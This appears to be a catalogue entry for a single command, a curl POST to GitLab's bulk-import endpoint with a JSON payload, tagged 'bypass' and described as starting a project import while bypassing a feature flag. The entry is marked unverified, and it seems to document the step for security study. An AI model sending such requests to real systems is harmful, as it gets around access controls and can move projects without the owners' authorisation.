---
data: >-
  curl 'https://gitlab.com/import/bulk_imports.json' -H ... --data-raw
  '{"bulk_import":[{"source_type":"project_entity","source_full_path":"group1/project1","destination_namespace":"secret-vakzz","destination_name":"group1aaa"}]}'
tags:
  - bypass
type: command
executor: bash
platforms:
  - Linux
id: 270e247b-848b-48b7-93c6-7243d51d85c8
created_at: '2025-12-11T03:48:05.993Z'
updated_at: '2025-12-11T03:48:05.993Z'
verified: false
validated: true
submitted: true
---
# curl-bulk-import

## Command

```bash
curl 'https://gitlab.com/import/bulk_imports.json' -H ... --data-raw '{"bulk_import":[{"source_type":"project_entity","source_full_path":"group1/project1","destination_namespace":"secret-vakzz","destination_name":"group1aaa"}]}'
```

## Description

Sends POST request to initiate bulk import, bypassing feature flag.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--data-raw` | JSON payload | Yes |

## Examples

### Basic Usage

```bash
curl 'https://example.com' --data-raw '{...}'
```

## Expected Output

Import initiation response

## Related

- #curl
